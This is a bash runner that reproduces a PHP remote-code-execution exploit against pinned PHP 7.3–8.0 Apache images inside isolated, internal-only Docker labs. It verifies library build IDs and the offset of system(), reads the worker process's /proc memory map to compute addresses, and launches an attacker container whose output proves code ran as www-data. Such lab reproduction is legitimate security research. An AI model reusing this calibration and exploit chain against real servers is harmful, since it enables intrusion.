#!/usr/bin/env bash
# Research-use only: fixed raw-key RCE proofs in isolated local Docker labs.
set -Eeuo pipefail

if (( $# != 0 )); then
    echo "this runner accepts no arguments, targets, images, offsets, or commands" >&2
    exit 64
fi

readonly ATTACKER_IMAGE="python@sha256:a0f57064cbdcd6285fa45f51237ab0b35ea8ebaed06a1f5973e89e19dfb86704"
readonly ATTACKER_IMAGE_ID="sha256:a33c10a97f11005523814c6eee013986119fe41f3122f444518117536675c8e1"
readonly -a VERIFIED_PROFILE_IDS=(
    "php-7.3.33"
    "php-7.4.33"
    "php-8.0.30"
)
readonly PROFILE_SELECTION="${PHP2SHELL_RAWKEY_PROFILE_ID:-all}"

case "$PROFILE_SELECTION" in
    all)
        SELECTED_PROFILE_IDS=("${VERIFIED_PROFILE_IDS[@]}")
        ;;
    php-7.3.33|php-7.4.33|php-8.0.30)
        SELECTED_PROFILE_IDS=("$PROFILE_SELECTION")
        ;;
    *)
        echo "refusing unknown raw-key profile ID: $PROFILE_SELECTION" >&2
        exit 64
        ;;
esac
readonly -a SELECTED_PROFILE_IDS

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_DIR
readonly RUN_ID="$(date -u +%Y%m%dT%H%M%SZ)-$$"
readonly ARTIFACTS_ROOT="$SCRIPT_DIR/artifacts/raw-key-partial-bucket"
readonly RUN_ROOT="$ARTIFACTS_ROOT/$RUN_ID"
readonly WORK_PARENT="$SCRIPT_DIR/.work"

for dependency in awk grep mktemp pgrep python3 readelf sed sha256sum uname; do
    command -v "$dependency" >/dev/null || {
        echo "missing dependency: $dependency" >&2
        exit 1
    }
done
if [[ "$(uname -s)" != "Linux" ]]; then
    echo "run inside Linux or WSL with a local Unix Docker socket" >&2
    exit 1
fi
if (( EUID != 0 )); then
    echo "local /proc calibration requires root; run with sudo" >&2
    exit 1
fi

if command -v docker >/dev/null; then
    DOCKER_BIN="$(command -v docker)"
elif [[ -x /snap/bin/docker ]]; then
    DOCKER_BIN=/snap/bin/docker
else
    echo "docker executable not found" >&2
    exit 1
fi
readonly DOCKER_BIN

# Match Docker CLI precedence: DOCKER_CONTEXT overrides DOCKER_HOST; an
# explicit DOCKER_HOST overrides the stored current context.
if [[ -n "${DOCKER_CONTEXT:-}" ]]; then
    endpoint_source="DOCKER_CONTEXT=$DOCKER_CONTEXT"
    effective_endpoint="$(
        "$DOCKER_BIN" context inspect "$DOCKER_CONTEXT" \
            --format '{{.Endpoints.docker.Host}}' 2>/dev/null
    )" || {
        echo "cannot inspect Docker context: $DOCKER_CONTEXT" >&2
        exit 1
    }
elif [[ -n "${DOCKER_HOST:-}" ]]; then
    endpoint_source="DOCKER_HOST"
    effective_endpoint="$DOCKER_HOST"
else
    context_name="$("$DOCKER_BIN" context show 2>/dev/null)" || {
        echo "cannot determine the Docker context" >&2
        exit 1
    }
    endpoint_source="current-context=$context_name"
    effective_endpoint="$(
        "$DOCKER_BIN" context inspect "$context_name" \
            --format '{{.Endpoints.docker.Host}}' 2>/dev/null
    )" || {
        echo "cannot inspect Docker context: $context_name" >&2
        exit 1
    }
fi

# Reject TCP, SSH, npipe, and other endpoints before the first docker info.
case "$effective_endpoint" in
    unix://*) ;;
    *)
        echo "refusing non-Unix Docker endpoint: $effective_endpoint" >&2
        exit 1
        ;;
esac
docker_socket="${effective_endpoint#unix://}"

if [[ ! -S "$docker_socket" ]] || ! "$DOCKER_BIN" info >/dev/null 2>&1; then
    if command -v snap >/dev/null && [[ "$DOCKER_BIN" == /snap/bin/docker ]]; then
        snap start docker >/dev/null 2>&1 || true
        for _ in {1..40}; do
            [[ -S "$docker_socket" ]] && \
                "$DOCKER_BIN" info >/dev/null 2>&1 && break
            sleep 0.25
        done
    fi
fi
if [[ ! -S "$docker_socket" ]]; then
    echo "local Docker socket is unavailable: $docker_socket" >&2
    exit 1
fi
"$DOCKER_BIN" info >/dev/null 2>&1 || {
    echo "cannot access the local Docker daemon" >&2
    exit 1
}

mkdir --parents -- "$ARTIFACTS_ROOT" "$WORK_PARENT"
mkdir -- "$RUN_ROOT"
printf 'source=%s\nendpoint=%s\nsocket=%s\n' \
    "$endpoint_source" "$effective_endpoint" "$docker_socket" \
    >"$RUN_ROOT/docker-endpoint.txt"

ensure_image() {
    local reference=$1 expected_id=$2 inspect_path=$3
    if ! "$DOCKER_BIN" image inspect "$reference" >"$inspect_path" 2>/dev/null; then
        "$DOCKER_BIN" pull --quiet --platform linux/amd64 "$reference" >/dev/null
        "$DOCKER_BIN" image inspect "$reference" >"$inspect_path"
    fi
    python3 "$SCRIPT_DIR/verify_lab.py" image \
        --inspect "$inspect_path" \
        --reference "$reference" \
        --expected-id "$expected_id"
}

ensure_image "$ATTACKER_IMAGE" "$ATTACKER_IMAGE_ID" \
    "$RUN_ROOT/attacker-image-inspect.json"

profile_spec() {
    case "$1" in
        php-7.3.33)
            PROFILE_TAG=73
            TARGET_IMAGE="mirror.gcr.io/library/php@sha256:b9872cd287ef72bc17d45d713aa2742f3d3bcf2503fea2506fd93aa94995219f"
            TARGET_IMAGE_ID="sha256:35da9118b3c0980fbaf84a4d410653642c9d55fb2f6c40011cc78de303837d64"
            EXPECTED_PHP="7.3.33"
            EXPECTED_APACHE="Apache/2.4.52 (Debian)"
            LIBPHP_PATH="/usr/lib/apache2/modules/libphp7.so"
            EXPECTED_LIBPHP_BUILD_ID="cb5f3581bd8fa554ea126c1b1b58020cfa3e8ebc"
            EXPECTED_LIBC_BUILD_ID="54eef5ce96cf37cb175b0d93186836ca1caf470c"
            EXPECTED_LIBC_SHA256="17abce7433ccac97a7a5e9c1d286b7337c30d01f25e0d837cfe78de9be61e768"
            EXPECTED_SYSTEM_SYMBOL="0x48e50"
            ;;
        php-7.4.33)
            PROFILE_TAG=74
            TARGET_IMAGE="mirror.gcr.io/library/php@sha256:c9d7e608f73832673479770d66aacc8100011ec751d1905ff63fae3fe2e0ca6d"
            TARGET_IMAGE_ID="sha256:20a3732f422b7b28dcf99e8597f093a8c135efca62ff0dc02a2d92d916369413"
            EXPECTED_PHP="7.4.33"
            EXPECTED_APACHE="Apache/2.4.54 (Debian)"
            LIBPHP_PATH="/usr/lib/apache2/modules/libphp7.so"
            EXPECTED_LIBPHP_BUILD_ID="a8f9e89e11da8db14855af2dd3a0d966f8e72d86"
            EXPECTED_LIBC_BUILD_ID="b503275bf9fee51581fdceef97533b194035b4f7"
            EXPECTED_LIBC_SHA256="263e55f639b540a00fc87e7fdc10078c1cbe89e148ea440ad1a9cef1cbd53c6f"
            EXPECTED_SYSTEM_SYMBOL="0x45e50"
            ;;
        php-8.0.30)
            PROFILE_TAG=80
            TARGET_IMAGE="mirror.gcr.io/library/php@sha256:c87b4c94d53b35520467b6d026f38656ab9a6d446fa3a0fbba1bc633125f9ad2"
            TARGET_IMAGE_ID="sha256:3357132d6ece3a509ce6f8abf6e7cf9886b343c504cb58428a7302cbe7abe446"
            EXPECTED_PHP="8.0.30"
            EXPECTED_APACHE="Apache/2.4.56 (Debian)"
            LIBPHP_PATH="/usr/lib/apache2/modules/libphp.so"
            EXPECTED_LIBPHP_BUILD_ID="22ea5e392e39c122039896feb5c9c52b75846581"
            EXPECTED_LIBC_BUILD_ID="a3780b0b8a5bf5876e31d16b0a9d8fc6ba69a1f2"
            EXPECTED_LIBC_SHA256="853155a83376d5837d2d3df8ff8a439c765d7e2ab947280d28d26720534a7f78"
            EXPECTED_SYSTEM_SYMBOL="0x45e50"
            ;;
        *)
            echo "internal error: profile escaped the allow-list: $1" >&2
            return 1
            ;;
    esac
    readonly PROFILE_TAG TARGET_IMAGE TARGET_IMAGE_ID EXPECTED_PHP EXPECTED_APACHE
    readonly LIBPHP_PATH EXPECTED_LIBPHP_BUILD_ID EXPECTED_LIBC_BUILD_ID
    readonly EXPECTED_LIBC_SHA256 EXPECTED_SYSTEM_SYMBOL
}

run_profile() (
    set -Eeuo pipefail
    local profile_id=$1
    profile_spec "$profile_id"

    local artifact_dir="$RUN_ROOT/$profile_id"
    local scratch_dir
    scratch_dir="$(mktemp -d "$WORK_PARENT/${profile_id}.XXXXXX")"
    chmod 0755 "$scratch_dir"
    mkdir -- "$artifact_dir"

    local suffix="${RUN_ID//[^A-Za-z0-9_.-]/-}-${PROFILE_TAG}-${RANDOM}"
    local network_name="p2s-raw-${PROFILE_TAG}-net-$suffix"
    local volume_name="p2s-raw-${PROFILE_TAG}-proof-$suffix"
    local target_name="p2s-raw-${PROFILE_TAG}-target-$suffix"
    local -a created_containers=()
    local network_created=0 volume_created=0

    cleanup_profile() {
        local rc=$?
        trap - EXIT
        set +e
        local cleanup_failed=0 name
        : >"$artifact_dir/cleanup.txt"
        for name in "${created_containers[@]}"; do
            if "$DOCKER_BIN" rm -f "$name" >>"$artifact_dir/cleanup.txt" 2>&1; then
                printf 'removed_container=%s\n' "$name" >>"$artifact_dir/cleanup.txt"
            else
                cleanup_failed=1
            fi
        done
        if (( network_created )); then
            if "$DOCKER_BIN" network rm "$network_name" >>"$artifact_dir/cleanup.txt" 2>&1; then
                printf 'removed_network=%s\n' "$network_name" >>"$artifact_dir/cleanup.txt"
            else
                cleanup_failed=1
            fi
        fi
        if (( volume_created )); then
            if "$DOCKER_BIN" volume rm "$volume_name" >>"$artifact_dir/cleanup.txt" 2>&1; then
                printf 'removed_volume=%s\n' "$volume_name" >>"$artifact_dir/cleanup.txt"
            else
                cleanup_failed=1
            fi
        fi
        case "$scratch_dir" in
            "$WORK_PARENT"/*) rm -rf -- "$scratch_dir" || cleanup_failed=1 ;;
            *) cleanup_failed=1 ;;
        esac
        (
            cd -- "$artifact_dir" || exit 1
            find . -maxdepth 1 -type f ! -name SHA256SUMS.txt -print0 \
                | sort -z | xargs -0 sha256sum >SHA256SUMS.txt
        ) || cleanup_failed=1
        if (( cleanup_failed )) && (( rc == 0 )); then
            rc=1
        fi
        exit "$rc"
    }
    trap cleanup_profile EXIT

    ensure_image "$TARGET_IMAGE" "$TARGET_IMAGE_ID" \
        "$artifact_dir/target-image-inspect.json"

    "$DOCKER_BIN" network create --internal \
        --label org.php2shell.purpose=isolated-research \
        "$network_name" >"$artifact_dir/network-create.txt"
    network_created=1
    "$DOCKER_BIN" network inspect "$network_name" \
        >"$artifact_dir/network-inspect.json"
    python3 "$SCRIPT_DIR/verify_lab.py" network \
        --inspect "$artifact_dir/network-inspect.json" --name "$network_name"

    "$DOCKER_BIN" volume create \
        --label org.php2shell.purpose=fixed-proof-output \
        "$volume_name" >"$artifact_dir/volume-create.txt"
    volume_created=1

    "$DOCKER_BIN" create \
        --name "$target_name" \
        --network "$network_name" \
        --network-alias target \
        --security-opt no-new-privileges:true \
        --pids-limit 64 \
        --memory 128m \
        --tmpfs /tmp:rw,nosuid,nodev,size=32m \
        --mount "type=bind,src=$SCRIPT_DIR/lab/php.ini,dst=/usr/local/etc/php/conf.d/zz-php2shell.ini,readonly" \
        --mount "type=bind,src=$SCRIPT_DIR/lab/mpm-prefork.conf,dst=/etc/apache2/mods-enabled/mpm_prefork.conf,readonly" \
        --mount "type=bind,src=$SCRIPT_DIR/lab/index.php,dst=/var/www/html/index.php,readonly" \
        --mount "type=bind,src=$SCRIPT_DIR/lab/runtime.php,dst=/var/www/html/runtime.php,readonly" \
        --mount "type=volume,src=$volume_name,dst=/out" \
        "$TARGET_IMAGE" \
        sh -eu -c 'chown www-data:www-data /out; chmod 0770 /out; rm -f /out/p; exec apache2-foreground' \
        >"$artifact_dir/target-container-id.txt"
    created_containers+=("$target_name")
    "$DOCKER_BIN" start "$target_name" >/dev/null
    "$DOCKER_BIN" inspect "$target_name" \
        >"$artifact_dir/target-container-inspect.json"
    python3 "$SCRIPT_DIR/verify_lab.py" container \
        --inspect "$artifact_dir/target-container-inspect.json" \
        --name "$target_name" \
        --image-reference "$TARGET_IMAGE" \
        --image-id "$TARGET_IMAGE_ID" \
        --network "$network_name" \
        --running \
        --output-volume "$volume_name" \
        --output-destination /out

    run_attacker() {
        local role=$1
        shift
        local name="p2s-raw-${PROFILE_TAG}-${role}-$suffix"
        local inspect_path="$artifact_dir/${role}-container-inspect.json"
        "$DOCKER_BIN" create \
            --name "$name" \
            --network "$network_name" \
            --read-only \
            --security-opt no-new-privileges:true \
            --cap-drop ALL \
            --pids-limit 64 \
            --memory 256m \
            --user 65532:65532 \
            --env PYTHONDONTWRITEBYTECODE=1 \
            --tmpfs /tmp:rw,noexec,nosuid,nodev,size=32m \
            --mount "type=bind,src=$SCRIPT_DIR,dst=/harness,readonly" \
            "$ATTACKER_IMAGE" \
            python3 /harness/probe.py "$@" \
            >"$artifact_dir/${role}-container-id.txt"
        created_containers+=("$name")
        "$DOCKER_BIN" inspect "$name" >"$inspect_path"
        python3 "$SCRIPT_DIR/verify_lab.py" container \
            --inspect "$inspect_path" \
            --name "$name" \
            --image-reference "$ATTACKER_IMAGE" \
            --image-id "$ATTACKER_IMAGE_ID" \
            --network "$network_name" \
            --user 65532:65532 \
            --hardened
        set +e
        "$DOCKER_BIN" start --attach "$name" \
            >"$artifact_dir/${role}.log" 2>&1
        local helper_rc=$?
        set -e
        printf '%s\n' "$helper_rc" >"$artifact_dir/${role}.exit"
        "$DOCKER_BIN" inspect "$name" \
            >"$artifact_dir/${role}-container-exit-inspect.json"
        if (( helper_rc != 0 )); then
            cat "$artifact_dir/${role}.log" >&2
            return "$helper_rc"
        fi
    }

    run_attacker runtime runtime
    python3 "$SCRIPT_DIR/verify_lab.py" runtime \
        --input "$artifact_dir/runtime.log" \
        --expected-php "$EXPECTED_PHP" \
        --expected-apache "$EXPECTED_APACHE" \
        --expected-sapi apache2handler \
        --expected-memory 32M

    "$DOCKER_BIN" exec "$target_name" apache2 -v \
        >"$artifact_dir/apache-version.txt"
    grep -Fxq "Server version: $EXPECTED_APACHE" \
        "$artifact_dir/apache-version.txt"
    "$DOCKER_BIN" exec "$target_name" sh -c 'apache2ctl -M 2>/dev/null' \
        >"$artifact_dir/apache-modules.txt"
    grep -Eq 'mpm_prefork_module' "$artifact_dir/apache-modules.txt"
    grep -Eq 'php(7)?_module' "$artifact_dir/apache-modules.txt"

    local init_pid worker_pid=""
    init_pid="$(
        "$DOCKER_BIN" inspect "$target_name" --format '{{.State.Pid}}'
    )"
    for _ in {1..100}; do
        mapfile -t workers < <(pgrep -P "$init_pid" -x apache2 || true)
        if (( ${#workers[@]} == 1 )); then
            worker_pid="${workers[0]}"
            break
        fi
        sleep 0.1
    done
    if [[ -z "$worker_pid" ]]; then
        echo "could not identify the exact single prefork worker" >&2
        exit 1
    fi
    python3 "$SCRIPT_DIR/verify_lab.py" worker \
        --pid "$worker_pid" \
        --expected-parent "$init_pid" \
        --output "$artifact_dir/worker-identity.json"

    local libc_path system_symbol libc_build_id libc_sha256 libphp_build_id
    libc_path="$(
        "$DOCKER_BIN" exec "$target_name" \
            readlink -f /lib/x86_64-linux-gnu/libc.so.6
    )"
    [[ "$libc_path" == /lib/x86_64-linux-gnu/libc-2.31.so ]]
    "$DOCKER_BIN" cp "$target_name:$libc_path" "$scratch_dir/libc.so.6" \
        >/dev/null
    "$DOCKER_BIN" cp "$target_name:$LIBPHP_PATH" "$scratch_dir/libphp.so" \
        >/dev/null
    libc_build_id="$(
        readelf -n "$scratch_dir/libc.so.6" \
            | awk '/Build ID:/ {print $3; exit}'
    )"
    libphp_build_id="$(
        readelf -n "$scratch_dir/libphp.so" \
            | awk '/Build ID:/ {print $3; exit}'
    )"
    read -r libc_sha256 _ < <(sha256sum "$scratch_dir/libc.so.6")
    system_symbol="$(
        readelf -Ws "$scratch_dir/libc.so.6" | awk \
            '$8 ~ /^system(@@|$)/ && !seen { value="0x" $2; seen=1 } END { if (seen) print value }'
    )"
    [[ "$libc_build_id" == "$EXPECTED_LIBC_BUILD_ID" ]]
    [[ "$libphp_build_id" == "$EXPECTED_LIBPHP_BUILD_ID" ]]
    [[ "$libc_sha256" == "$EXPECTED_LIBC_SHA256" ]]
    [[ "$system_symbol" =~ ^0x[0-9a-fA-F]+$ ]]
    (( system_symbol == EXPECTED_SYSTEM_SYMBOL ))

    printf '%s\n' \
        "profile=$profile_id" \
        "target_image=$TARGET_IMAGE" \
        "target_image_id=$TARGET_IMAGE_ID" \
        "attacker_image=$ATTACKER_IMAGE" \
        "attacker_image_id=$ATTACKER_IMAGE_ID" \
        "php=$EXPECTED_PHP" \
        "apache=$EXPECTED_APACHE" \
        "sapi=apache2handler" \
        "memory_limit=32M" \
        "init_pid=$init_pid" \
        "worker_pid=$worker_pid" \
        "container_libc=$libc_path" \
        "libc_build_id=$libc_build_id" \
        "libc_sha256=$libc_sha256" \
        "system_symbol=$system_symbol" \
        "libphp_path=$LIBPHP_PATH" \
        "libphp_build_id=$libphp_build_id" \
        >"$artifact_dir/runtime.txt"

    run_attacker control control

    mapfile -t workers_after < <(pgrep -P "$init_pid" -x apache2 || true)
    if (( ${#workers_after[@]} != 1 )) || \
       [[ "${workers_after[0]}" != "$worker_pid" ]]; then
        echo "control request did not preserve the measured worker" >&2
        exit 1
    fi

    cp -- "/proc/$worker_pid/maps" "$artifact_dir/worker.maps"
    python3 "$SCRIPT_DIR/calibrate_local.py" \
        --pid "$worker_pid" \
        --system-symbol "$system_symbol" \
        >"$artifact_dir/proc-calibration.txt"
    local ar_data system_address
    ar_data="$(sed -n 's/^PROC_ARDATA=//p' "$artifact_dir/proc-calibration.txt")"
    system_address="$(sed -n 's/^PROC_SYSTEM=//p' "$artifact_dir/proc-calibration.txt")"
    if [[ ! "$ar_data" =~ ^0x[0-9a-f]+$ ]] || \
       [[ ! "$system_address" =~ ^0x[0-9a-f]+$ ]]; then
        echo "local calibration did not return valid addresses" >&2
        exit 1
    fi

    run_attacker exploit exploit \
        --ar-data "$ar_data" --system "$system_address"

    "$DOCKER_BIN" cp "$target_name:/out/p" "$artifact_dir/proof.txt"
    grep -Eq '^uid=33\(www-data\) gid=33\(www-data\)' "$artifact_dir/proof.txt"
    "$DOCKER_BIN" logs "$target_name" >"$artifact_dir/target.log" 2>&1 || true
    "$DOCKER_BIN" inspect "$target_name" \
        >"$artifact_dir/target-container-final-inspect.json"

    (
        cd -- "$SCRIPT_DIR"
        sha256sum \
            .gitignore README.md THIRD_PARTY_NOTICES.md \
            THIRD_PARTY_LICENSES/78ResearchLab-MIT.txt \
            calibrate_local.py probe.py run-local-docker-lab.sh verify_lab.py \
            lab/index.php lab/mpm-prefork.conf lab/php.ini lab/runtime.php \
            >"$artifact_dir/SOURCE_SHA256SUMS.txt"
    )

    printf '%s\t%s\n' "$profile_id" "$(cat "$artifact_dir/proof.txt")" \
        >>"$RUN_ROOT/SUMMARY.txt"
    cat "$artifact_dir/proc-calibration.txt"
    cat "$artifact_dir/proof.txt"
    echo "$profile_id: RCE_PROOF_PRESENT"
)

: >"$RUN_ROOT/SUMMARY.txt"
for profile_id in "${SELECTED_PROFILE_IDS[@]}"; do
    run_profile "$profile_id"
done

(
    cd -- "$RUN_ROOT"
    find . -type f ! -path './SHA256SUMS.txt' -print0 \
        | sort -z | xargs -0 sha256sum >SHA256SUMS.txt
)
cat "$RUN_ROOT/SUMMARY.txt"
echo "artifacts: $RUN_ROOT"
